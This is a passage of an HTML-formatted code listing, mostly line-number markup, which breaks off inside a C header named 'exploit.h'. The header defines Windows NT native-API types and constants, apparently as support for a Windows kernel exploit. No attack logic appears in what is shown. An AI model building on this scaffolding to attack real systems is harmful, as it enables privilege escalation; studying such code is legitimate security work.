class=&quot;line&quot;&gt;413&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;414&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;415&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;416&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;417&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;418&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;419&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;420&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;421&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;422&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;423&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;424&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;425&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;426&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;427&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;428&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;429&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;430&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;431&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;432&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;433&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;434&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;435&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;436&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;437&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;438&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;439&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;440&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;441&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;442&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;443&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;444&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;445&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;446&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;447&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;448&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;449&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;450&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;451&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;452&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;453&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;454&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;455&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;456&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;457&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;458&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;459&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;460&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;461&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;462&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;463&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;464&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;465&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;466&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;467&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;468&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;469&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;470&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;471&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;472&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;473&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;474&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;475&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;476&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;477&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;478&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;479&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;480&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;481&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;482&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;483&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;484&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;485&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;486&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;487&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;488&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;489&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;490&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;491&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;492&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;493&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;494&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;495&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;496&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;497&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;498&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;499&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;500&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;501&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;502&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;503&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;504&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;505&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;506&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;507&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;508&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;509&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;510&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;511&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;512&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;513&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;514&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;515&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;516&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;517&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;518&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;519&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;520&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;521&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;522&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;523&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;524&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;525&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;526&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;527&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;528&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;529&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;530&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;531&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;532&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;533&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;534&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;535&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;536&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;537&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;538&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;539&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;540&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;541&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;542&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;543&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;544&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;545&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;546&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;547&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;548&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;549&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;550&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;551&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;552&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;553&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;554&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;555&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;556&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;557&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;558&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;559&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;560&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;561&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;562&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;563&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;564&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;565&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;566&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;567&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;568&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;569&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;570&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;571&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;572&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;573&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;574&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;575&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;576&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;577&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;578&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;579&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;580&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;581&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;582&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;583&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;584&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;585&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;586&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;587&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;588&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;589&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;590&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;591&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;592&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;593&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;594&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;595&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;596&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;597&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;598&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;599&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;600&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;601&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;602&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;603&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;604&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;605&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;606&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;607&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;608&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;609&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;610&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;611&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;612&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;613&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;614&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;615&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;616&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;617&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;618&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;619&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;620&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;621&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;622&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;623&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;624&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;625&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;626&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;627&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;628&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;629&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;630&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;631&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;632&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;633&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;634&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;635&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;636&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;637&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;638&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;639&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;640&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;641&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;642&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;643&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;644&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;645&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;646&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;***************************** exploit.h ***************************&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;ifndef&lt;/span&gt; _EXPLOIT_H&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; _EXPLOIT_H&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;windows.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; IMP_VOID __declspec(dllimport) VOID __stdcall&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; IMP_SYSCALL __declspec(dllimport) NTSTATUS __stdcall&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; PAGE_SIZE 0xA00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; OBJ_CASE_INSENSITIVE 0x00000040&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; FILE_OPEN_IF 0x00000003&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; NtCurrentProcess() ((HANDLE)0xFFFFFFFF)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; KERNEL_NAME_LENGTH 0x0D&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; STATUS_SUCCESS 0x00000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; STATUS_INFO_LENGTH_MISMATCH 0xC0000004&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;typedef&lt;/span&gt; ULONG NTSTATUS;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; _ANSI_STRING&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* 0x00 */&lt;/span&gt; USHORT Length;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* 0x02 */&lt;/span&gt; USHORT MaximumLength;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* 0x04 */&lt;/span&gt; PCHAR Buffer;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* 0x08 */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ANSI_STRING,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  *PANSI_STRING,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;**PPANSI_STRING;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; _UNICODE_STRING &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* 0x00 */&lt;/span&gt; USHORT Length;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* 0x02 */&lt;/span&gt; USHORT MaximumLength;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* 0x04 */&lt;/span&gt; PWSTR Buffer;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* 0x08 */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    UNICODE_STRING,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  *PUNICODE_STRING,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;**PPUNICODE_STRING;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; _OBJECT_ATTRIBUTES&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* 0x00 */&lt;/span&gt; ULONG Length;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* 0x04 */&lt;/span&gt; HANDLE RootDirectory;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* 0x08 */&lt;/span&gt; PUNICODE_STRING ObjectName;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* 0x0C */&lt;/span&gt; ULONG Attributes;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* 0x10 */&lt;/span&gt; PSECURITY_DESCRIPTOR SecurityDescriptor;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* 0x14 */&lt;/span&gt; PSECURITY_QUALITY_OF_SERVICE SecurityQualityOfService;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* 0x18 */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    OBJECT_ATTRIBUTES,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  *POBJECT_ATTRIBUTES,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;**PPOBJECT_ATTRIBUTES;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; _IO_STATUS_BLOCK&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;union&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/* 0x00 */&lt;/span&gt; NTSTATUS Status; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;/* 0x00 */&lt;/span&gt; PVOID Pointer; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* 0x04 */&lt;/span&gt; 